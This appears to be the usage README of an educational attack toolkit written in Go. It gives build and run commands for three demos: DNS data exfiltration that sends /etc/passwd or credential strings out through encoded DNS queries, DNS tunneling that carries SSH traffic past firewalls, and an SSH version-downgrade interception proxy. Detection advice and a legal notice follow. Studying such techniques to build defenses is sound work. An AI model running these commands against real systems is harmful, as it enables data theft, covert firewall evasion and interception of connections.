# Usage Examples

## DNS Data Exfiltration

### Start the server (requires sudo for port 53, or use 5353 for testing):

```bash
# Build the server
go build -o dns-exfil-server ./cmd/dns-exfil/server

# Run on non-privileged port for testing
./dns-exfil-server -domain exfil.local -port 5353 -output captured.dat
```

### Run the client to exfiltrate data:

```bash
# Build the client
go build -o dns-exfil-client ./cmd/dns-exfil/client

# Exfiltrate a file
./dns-exfil-client -domain exfil.local -server 127.0.0.1:5353 -file /etc/passwd

# Exfiltrate arbitrary data
./dns-exfil-client -domain exfil.local -server 127.0.0.1:5353 -data "secret credentials"
```

### What happens:
- Client encodes data into DNS-safe base32 format
- Data is split into chunks that fit in DNS labels (max 63 bytes)
- Each chunk is sent as a subdomain query: `<seq>-<data>.exfil.local`
- Server receives queries, decodes them, and reassembles the original file
- Press Ctrl+C on server to save the exfiltrated data

## DNS Tunneling

### Start the tunnel server:

```bash
# Build
go build -o dns-tunnel-server ./cmd/dns-tunnel/server

# Run (forward DNS queries to SSH server)
./dns-tunnel-server -domain tunnel.local -port 5353 -upstream 127.0.0.1:22
```

### Start the tunnel client:

```bash
# Build
go build -o dns-tunnel-client ./cmd/dns-tunnel/client

# Run (creates local proxy on port 2222)
./dns-tunnel-client -domain tunnel.local -server 127.0.0.1:5353 -port 2222
```

### Use the tunnel:

```bash
# SSH through the DNS tunnel
ssh -p 2222 user@localhost
```

### What happens:
- Client listens on local port (e.g., 2222)
- All data sent to that port is encoded and sent via DNS TXT queries
- DNS server receives queries, decodes data, forwards to upstream service
- Responses come back through DNS TXT record responses
- Bypasses firewalls that only allow DNS traffic

## SSH Downgrade Attack

### Start the proxy:

```bash
# Build
go build -o ssh-downgrade ./cmd/ssh-downgrade

# Run (intercepts SSH connections)
./ssh-downgrade -listen 127.0.0.1:2222 -target 127.0.0.1:22
```

### Test with SSH client:

```bash
# Connect through the proxy
ssh -p 2222 user@localhost

# Watch the proxy logs to see:
# - Original SSH version from server
# - Modified version sent to client
# - Client's version response
# - Whether downgrade was accepted
# - Weak algorithms detected in negotiation
```

### What happens:
- Proxy intercepts SSH connection before encryption starts
- Modifies server's SSH-2.0 version string to SSH-1.99 or SSH-1.5
- Client may accept downgrade and use vulnerable legacy protocol
- Proxy monitors for weak algorithms in key exchange
- Demonstrates why protocol version pinning is important

## Detection and Defense

### Detecting DNS exfiltration:
- Monitor for unusually high volume of DNS queries
- Look for long subdomain names (encoded data)
- Check for sequential queries to same domain
- Analyze queries to non-existent domains (NXDOMAIN responses)

### Detecting DNS tunneling:
- Large DNS queries/responses (especially TXT records)
- High frequency of DNS queries from single host
- DNS queries with high entropy in subdomain names
- Unusual DNS record types

### Defending against SSH downgrade:
- Configure SSH client to only accept SSH-2.0: `Protocol 2` in ssh_config
- Disable weak algorithms in sshd_config
- Use modern SSH implementations that reject downgrades
- Monitor for SSH version mismatches in logs

## Legal and Ethical Notes

**These tools are for education only.** 

Never use them against systems you don't own or have explicit permission to test. Unauthorized access and data exfiltration are serious crimes in most jurisdictions.

Use these demonstrations to:
- Understand how attacks work
- Test your own defensive monitoring
- Train security teams
- Improve network security policies
